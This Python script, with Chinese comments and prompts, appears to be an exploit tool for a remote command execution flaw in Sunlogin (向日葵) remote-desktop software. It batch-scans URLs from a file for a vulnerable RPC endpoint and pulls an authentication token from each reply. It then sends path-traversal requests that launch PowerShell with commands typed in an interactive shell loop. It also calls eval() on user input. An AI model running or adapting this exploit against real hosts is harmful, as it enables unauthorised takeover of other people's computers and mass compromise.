import requests
import json
import re

timeout_seconds = 3  # 设置超时时间，单位为秒

# 批量检测


def check_url(url):
    try:
        if("/cgi-bin/rpc?action=verify-haras" not in url):
            url = url + "/cgi-bin/rpc?action=verify-haras"
        response = requests.get(url, timeout=timeout_seconds)

        if response.status_code == 200:
            print(f"URL: {url} - 请求成功！")
            print("回显内容：")
            print(response.text)
            with open("./successful_urls.txt", "a") as file:
                file.write(url + "\n")
                file.write(response.text+"\n")
                file.write("-----"+"\n")

        else:
            print(f"URL: {url} - 请求失败，状态码：{response.status_code}")

    except requests.Timeout:
        print(f"URL: {url} - 请求超时。")
    except requests.RequestException as e:
        print(f"URL: {url} - 请求发生异常：{e}")
    return response.text


def check():
    # 从文件读取URL并进行遍历检测
    with open(r"./urls.txt", "r") as file:
        for line in file:
            url = line.strip()  # 去除换行符和空格
            check_url(url)


################

def attack(url):
    def exp(url, ck, cmd):
        url = url+"/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20"+cmd
        timeout_seconds = 5  # 设置超时时间，单位为秒

        headers = {
            "Cookie": "CID=" + ck
        }

        try:

            response = requests.get(
                url, headers=headers, timeout=timeout_seconds)
            if response.status_code == 200:
                print("请求成功！")
                print("回显内容：")
                print(response.text)
            else:
                print(f"请求失败，状态码：{response.status_code}")

        except requests.Timeout:
            print("请求超时。")
        except requests.RequestException as e:
            print(f"请求发生异常：{e}")

    # 从文件读取URL进行分组和提取
    text = check_url(url)
    # print(text)
    json_dict = json.loads(text)
    cookie = (json_dict["verify_string"])
    # print(cookie)
    while(True):
        cmd = input("请输入指令")
        exp(url, cookie, cmd)
# 攻击请求部分


print("---------------欢迎使用向日葵RCE----------------")
print("1.向日葵漏洞批量检测(请将url放入同目录下的urls.txt中)")
print("2.向日葵漏洞利用")
choice = eval(input("请输入你想要选择的功能:\n>>>"))
while((choice > 2 or choice < 1)):
    choice = eval(input("请输入你想要选择的功能:\n>>>"))

if(choice == 1):
    check()
    print("结果已放在同目录下的successful_urls.txt中")
if(choice == 2):
    url = input("请输入url:\n>>>")
    attack(url)
# attack()
